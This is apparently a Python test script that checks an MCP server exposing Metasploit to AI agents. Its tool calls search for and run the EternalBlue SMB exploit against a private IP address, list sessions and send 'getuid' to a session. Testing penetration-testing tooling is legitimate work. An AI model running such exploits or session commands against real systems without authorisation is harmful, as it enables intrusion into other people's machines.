import asyncio

from web.mcp_server.server import mcp


async def verify_mcp_tools():
    print("--- Verifying MCP Tools Registration ---")
    # In FastMCP, we can access the tool definitions
    tools = mcp._tools
    for tool_name, tool in tools.items():
        print(f"Tool Registered: {tool_name}")

    print("\n--- Testing 'list_exploits' ---")
    results = await mcp.call_tool("list_exploits", {"query": "eternalblue"})
    print(f"Exploits Found: {results}")

    print("\n--- Testing 'list_payloads' ---")
    payloads = await mcp.call_tool("list_payloads", {"platform": "windows"})
    print(f"Windows Payloads: {payloads}")

    print("\n--- Testing 'run_exploit' ---")
    exploit_run = await mcp.call_tool(
        "run_exploit",
        {
            "module_path": "exploit/windows/smb/ms17_010_eternalblue",
            "options": {"RHOSTS": "192.168.1.100"},
            "run_check": True,
        },
    )
    print(f"Exploit Run Result: {exploit_run}")

    print("\n--- Testing 'list_active_sessions' ---")
    sessions = await mcp.call_tool("list_active_sessions", {})
    print(f"Active Sessions: {sessions}")

    print("\n--- Testing 'send_session_command' ---")
    cmd_result = await mcp.call_tool(
        "send_session_command", {"session_id": 1, "command": "getuid"}
    )
    print(f"Command Result: {cmd_result}")

    print("\n--- Testing 'list_listeners' ---")
    listeners = await mcp.call_tool("list_listeners", {})
    print(f"Listeners: {listeners}")

    print("\n--- Testing 'suggest_msf_modules' ---")
    recon_data = {"technologies": ["WordPress", "PHP"]}
    suggestions = await mcp.call_tool("suggest_msf_modules", {"recon_data": recon_data})
    print(f"Suggestions: {suggestions}")


if __name__ == "__main__":
    asyncio.run(verify_mcp_tools())
